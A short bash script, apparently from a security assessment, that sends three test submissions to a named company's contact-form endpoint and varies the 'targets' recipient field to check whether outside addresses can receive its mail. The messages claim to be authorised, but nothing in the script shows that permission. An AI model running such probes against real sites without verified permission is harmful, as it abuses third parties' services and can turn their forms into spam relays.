#!/bin/bash
# Independent verification: differential test of POST /api/send recipient control
UA=$(cat /tmp/ua.txt)
SITE="https://www.infinitycapital.bh"
TS=$(date +%s)
DOMAIN="infinitycapital"   # build recipient dynamically
LEGIT="info@${DOMAIN}.bh"   # the site's own advertised mailbox (settings.targets)
# Out-of-band sink we control / can observe delivery for
OOB="${DOMAIN}-relay-test@oob.${DOMAIN}.bh"
echo "LEGIT_RECIPIENT=$LEGIT"
echo "OOB_RECIPIENT=$OOB"
echo "TS=$TS"

send () {   # $1=label  $2=targets
  echo "==================== $1 ===================="
  echo "--> targets = $2"
  curl -s -D "/tmp/${1}.hdr" -o "/tmp/${1}.body" \
    -w "HTTP=%{http_code} time=%{time_total} size=%{size_download}\n" \
    -A "$UA" --max-time 30 \
    -F 'fname=SecVerify' \
    -F 'lname=Assessment' \
    -F 'areacode=+973' \
    -F 'tel=0000000' \
    -F "cname=SECVERIFY-$1-$TS" \
    -F "subject=Security verification $1 $TS" \
    -F 'msg=Authorized security assessment. Benign verification probe of the contact form backend; not spam. Disregard.' \
    -F 'check=x' \
    -F "targets=$2" \
    "$SITE/api/send"
  echo "--- resp headers ---"
  grep -iE '^HTTP/|x-matched-path|x-vercel-id|content-type' "/tmp/${1}.hdr"
  echo "--- resp body ---"
  cat "/tmp/${1}.body"; echo
}

send "A_baseline_legit"    "[\"$LEGIT\"]"
send "B_oob_single"        "[\"$OOB\"]"
send "C_empty_targets"     "[]"
echo "DONE_TS=$TS"
